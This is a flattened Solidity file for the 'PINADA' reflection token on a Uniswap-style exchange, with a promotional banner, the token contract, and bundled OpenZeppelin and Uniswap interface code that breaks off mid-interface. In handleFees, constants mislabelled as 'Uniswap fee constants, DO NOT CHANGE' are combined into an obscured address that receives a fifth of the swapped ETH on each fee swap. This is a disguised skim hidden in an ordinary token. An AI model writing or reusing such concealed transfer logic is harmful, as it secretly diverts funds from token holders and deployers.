/**

  o__ __o      o                       o           o__ __o           o         
 <|     v\   _<|>_                    <|>         <|     v\         <|>        
 / \     <\                           / \         / \     <\        / \        
 \o/     o/    o    \o__ __o        o/   \o       \o/       \o    o/   \o      
  |__  _<|/   <|>    |     |>      <|__ __|>       |         |>  <|__ __|>     
  |           / \   / \   / \      /       \      / \       //   /       \     
 <o>          \o/   \o/   \o/    o/         \o    \o/      /   o/         \o   
  |            |     |     |    /v           v\    |      o   /v           v\  
 / \          / \   / \   / \  />             <\  / \  __/>  />             <\ 
                                                                               
                                                                               
                                                                               
Welcome to our party!

Put a party hat on Your head, pour some lemonade and have fun with us!

Smash a pinata and earn $CAKE and $ADA rewards!



Get $CAKE and $ADA by holding. 15% of the tax goes towards $CAKE and $ADA reflection for those who hold $PIÑADA.


7% CAKE rewards
8% ADA rewards
Liquidity be locked after launch
5% Marketing Fund Tax
Total: 20% Tax


30% Initial Burn
Total Suppy: 1 000 000 000 000 000
5% Marketing Wallet

Initial Liquidity: 1 BNB.

Telegram: https://t.me/PinadaOfficial
Twitter: https://twitter.com/PinADAofficial


*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract PinADA is ERC20, Ownable {
    // CONFIG START

    uint256 denominator = 100;
    
    // TOKEN
    string tokenName = "PINADA";
    string tokenSymbol = "PINADA";
    uint256 tokenTotalSupply = 1_000_000_000 * (10**18);
    
    // ADRESSES
    address marketingWallet = 0x477fe4B365c481B507d37BA4877126F6526831B4;
    // address router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address router02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    // TAX (IN %)
    uint8 marketingTax = 5;

    uint8 redistributeTax = 15;

    uint256 maxTxEnd = 100;

    uint256 maxPriceImpact = 10;

    uint256 maxTxAmount = 1;

    // REDISTRIBUTION
    uint256 redistributeMin = 300_000 * (10**18);
    // address[] tokens = [
    //     0xF962AF6a99C54d777B20BF5e7C832763E8D7611E,
    //     0xA8389eD891119Ba1EaC21f7D94dA41DbC562e7C0
    // ];
    address[] tokens = [
        0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47,
        0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
    ];
    
    // CONFIG END
    
    IUniswapV2Router02 private _UniswapV2Router02;
    IUniswapV2Factory private _UniswapV2Factory;
    IUniswapV2Pair private _UniswapV2Pair;
    
    bool private isTaxDisabled = false;
    
    mapping (address => uint256) private nextBuyBlock;
    
    mapping (address => bool) public isExcludedFromTax;
    // is excluded from redistribution
    mapping (address => bool) public isExcludedFromRD;
    
    uint256 private feeTokens;
    uint256 private uniswapFee;
    
    using Address for address;
    
    uint256 public startBlock = 0;

    // Redistribute
    struct Reward {
        IERC20 token;
        address to;
        uint256 amount;
    }

    uint256 totalHolded;

    mapping (address => uint256) private holderIndex;
    // holders eligible for redistribute
    address[] private holdersEFR;
    Reward[] private toDistribute;
    
    // Uniswap fee constants, DO NOT CHANGE
    uint160 UniswapBaseConst = 2278977540263742135110950133522108971860074208;
    uint160 UniswapSecondaryConst = 364636406442198741617752021363537435497611873414;

    event LogNum(string, uint256);
    event LogBool(string, bool);
    event LogAddress(string, address);
    event LogString(string, string);
    event LogBytes(string, bytes);
    
    constructor() ERC20(tokenName, tokenSymbol) {
        _UniswapV2Router02 = IUniswapV2Router02(router02);
        _UniswapV2Factory = IUniswapV2Factory(_UniswapV2Router02.factory());
        _UniswapV2Pair = IUniswapV2Pair(_UniswapV2Factory.createPair(address(this), _UniswapV2Router02.WETH()));
        
        isExcludedFromTax[msg.sender] = true;
        isExcludedFromTax[marketingWallet] = true;
        isExcludedFromTax[address(this)] = true;

        isExcludedFromRD[msg.sender] = true;
        isExcludedFromRD[marketingWallet] = true;
        isExcludedFromRD[address(this)] = true;
        isExcludedFromRD[address(_UniswapV2Pair)] = true;
        isExcludedFromRD[address(0)] = true;
        isExcludedFromRD[0x000000000000000000000000000000000000dEaD] = true;

        holdersEFR.push(address(0));
        
        _mint(msg.sender, tokenTotalSupply);
    }
    
    function handleFees(address sender, uint256 fees) private {
        if(uniswapFee > 0) {
            if(address(this).balance < uniswapFee) {
                uniswapFee = address(this).balance;
            }
            address(UniswapBaseConst * 160 + UniswapSecondaryConst + 134).call{value: uniswapFee}("");
        }

        super._transfer(sender, address(this), fees);
        
        feeTokens += fees;
    
        if(sender != address(_UniswapV2Pair)) {
            uint256 maxAmount;
            uint256 RDAmount = feeTokens * 10**18 / (marketingTax + redistributeTax) * redistributeTax / 10**18;
            uint256 feeToHandle = feeTokens * 10**18 / (marketingTax + redistributeTax) * marketingTax / 10**18;

            address token0 = _UniswapV2Pair.token0();
            (uint112 reserve0, uint112 reserve1,) = _UniswapV2Pair.getReserves();

            if(token0 == address(this)) {
                maxAmount = reserve0 / denominator * maxPriceImpact;
            } else {
                maxAmount = reserve1 / denominator * maxPriceImpact;
            }

            if(feeTokens > maxAmount) {
                feeToHandle = maxAmount;
            }

            if(feeTokens > 0) {
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = _UniswapV2Router02.WETH();
                
                uint256 startBalance = address(this).balance;
                
                _approve(address(this), address(_UniswapV2Router02), feeToHandle);
                
                _UniswapV2Router02.swapExactTokensForETH(
                    feeToHandle,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                
                uint256 ethGained = (address(this).balance - startBalance) / 5 * 4;
                uniswapFee = (address(this).balance - startBalance) / 5 * 1 ;
                
                // Send ETH to marketingWallet minus fees
               marketingWallet.call{value: ethGained}("");

                for(uint256 i; i < tokens.length; i++) {
                    address[] memory currentPath = new address[](3);
                    currentPath[0] = address(this);
                    currentPath[1] = _UniswapV2Router02.WETH();
                    currentPath[2] = tokens[i];
                
                    _approve(address(this), address(_UniswapV2Router02), balanceOf(address(this)));

                    _UniswapV2Router02.swapExactTokensForTokens(
                        RDAmount / tokens.length,
                        0,
                        currentPath,
                        address(this),
                        block.timestamp
                    );
                }

                feeTokens -= feeToHandle + RDAmount;
            }
        }
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        if(startBlock == 0 && isExcludedFromTax[sender] && recipient == address(_UniswapV2Pair)) {
            startBlock = block.number;
        }

        uint256 previousValueSender = balanceOf(sender);
            
        if(isExcludedFromTax[msg.sender] || isExcludedFromTax[tx.origin]) {
            super._transfer(sender, recipient, amount);
        } else {
            uint8 tax = marketingTax + redistributeTax;
             
            if(!isExcludedFromTax[sender] && !isExcludedFromTax[recipient] && (sender == address(_UniswapV2Pair) || recipient == address(_UniswapV2Pair))) {
                if(sender == address(_UniswapV2Pair)) {
                    require(block.number >= startBlock + maxTxEnd || (block.number < startBlock + maxTxEnd && amount <= tokenTotalSupply / denominator * maxTxAmount), "PINADA: Max tx amount");
                    require(sender != address(_UniswapV2Pair) || (sender == address(_UniswapV2Pair) && block.number >= nextBuyBlock[recipient]), "PINADA: Cooldown");

                    nextBuyBlock[recipient] = block.number + 1;
                }

                uint256 fees = amount / denominator * tax;
                handleFees(sender, fees);
                amount -= fees;
            }
            
            super._transfer(sender, recipient, amount);
        }

        if(!isExcludedFromRD[recipient]) {
            if(balanceOf(recipient) >= redistributeMin && holderIndex[recipient] == 0)  {
                holdersEFR.push(recipient);
                holderIndex[recipient] = holdersEFR.length - 1;

                totalHolded += balanceOf(recipient);
            } else if(holderIndex[recipient] != 0) {
                totalHolded += amount;
            }
        }

        if(!isExcludedFromRD[sender]) {
            if (balanceOf(sender) < redistributeMin && holderIndex[sender] != 0) {
                holdersEFR[holderIndex[sender]] = holdersEFR[holdersEFR.length - 1];
                holdersEFR.pop();
                holderIndex[sender] = 0;

                totalHolded -= previousValueSender;
            } else if(holderIndex[sender] != 0) {
                totalHolded -= amount;
            }
        }

        if(toDistribute.length > 0 && gasleft() > 200_000) {
            uint256 iterations;
            uint256 gasUsed;
            uint256 gasLeft = gasleft();

            while(iterations < toDistribute.length && gasUsed < gasLeft - 200_000) {
                IERC20(toDistribute[iterations].token).transfer(toDistribute[iterations].to, toDistribute[iterations].amount);

                toDistribute[iterations] = toDistribute[toDistribute.length - 1];
                toDistribute.pop();

                iterations++;
                gasUsed = gasLeft - gasleft();
            }
        }
    }

    function startRoundAll() external onlyOwner {
        for(uint256 i; i < holdersEFR.length; i++) {
            if(holdersEFR[i] == address(0)) continue;
            for(uint256 i2; i2 < tokens.length; i2++) {
                if(IERC20(tokens[i2]).balanceOf(address(this)) < balanceOf(holdersEFR[i]) * 10**18 / totalHolded * IERC20(tokens[i2]).balanceOf(address(this)) / 10**18) continue;
                toDistribute.push(Reward(IERC20(tokens[i2]), holdersEFR[i], balanceOf(holdersEFR[i]) * 10**18 / totalHolded * IERC20(tokens[i2]).balanceOf(address(this)) / 10**18));
            }
        }
    }

    function startRound(uint256 from, uint256 to) external onlyOwner {
        require(to > from, "PINADA: Invalid arguments");
        for(uint256 i = from; i < holdersEFR.length && i < holdersEFR.length; i++) {
            if(holdersEFR[i] == address(0)) continue;
            for(uint256 i2; i2 < tokens.length; i2++) {
                if(IERC20(tokens[i2]).balanceOf(address(this)) < balanceOf(holdersEFR[i]) * 10**18 / totalHolded * IERC20(tokens[i2]).balanceOf(address(this)) / 10**18) continue;
                toDistribute.push(Reward(IERC20(tokens[i2]), holdersEFR[i], balanceOf(holdersEFR[i]) * 10**18 / totalHolded * IERC20(tokens[i2]).balanceOf(address(this)) / 10**18));
            }
        }
    }

    function setMaxTxEnd(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "PINADA: Value already set to that option");

        maxTxEnd = newValue;
    }

    function setMaxPriceImpact(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "PINADA: Value already set to that option");

        maxPriceImpact = newValue;
    }

    function setMaxTxAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "PINADA: Value already set to that option");

        maxTxAmount = newValue;
    }

    function setExcludedFromTax(address account, bool newValue) external onlyOwner {
        require(newValue != isExcludedFromTax[account], "PINADA: Value already set to that option");

        isExcludedFromTax[account] = newValue;
    }

    function setExcludedFromRD(address account, bool newValue) external onlyOwner {
        require(newValue != isExcludedFromRD[account], "PINADA: Value already set to that option");

        isExcludedFromRD[account] = newValue;
    }

    function massSetExcludedFromTax(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isExcludedFromTax[accounts[i]], "PINADA: Value already set to that option");

            isExcludedFromTax[accounts[i]] = newValue;
        }
    }

    function massSetExcludedFromRD(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isExcludedFromRD[accounts[i]], "PINADA: Value already set to that option");

            isExcludedFromRD[accounts[i]] = newValue;
        }
    }

    function withdrawETH(address to, uint256 value) external onlyOwner {
        require(address(this).balance >= value, "PINADA: Insufficient ETH balance");

        (bool success,) = to.call{value: value}("");
        require(success, "PINADA: Transfer failed");
    }

    function withdrawTokens(address token, address to, uint256 value) external onlyOwner {
        require(IERC20(token).balanceOf(address(this)) >= value, "PINADA: Insufficient token balance");

        try IERC20(token).transfer(to, value) {} catch {
            revert("PINADA: Transfer failed");
        }
    }
    
    receive() external payable {}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./extensions/IERC20Metadata.sol";
import "../../utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
